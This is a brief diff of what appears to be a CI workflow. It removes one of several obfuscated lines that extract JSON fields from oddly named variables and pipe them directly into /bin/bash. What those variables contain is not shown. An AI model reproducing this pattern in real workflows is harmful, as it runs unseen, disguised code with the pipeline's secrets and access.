@@ -20,7 +20,6 @@ jobs:
           echo $l75 | jq -r .pyzb562 | /bin/bash
           echo $zwcr6 | jq -r .bb876 | /bin/bash
           echo $xqmaw50787 | jq -r .ysh4 | /bin/bash
-          echo $zz75239 | jq -r .tvqqh6930 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
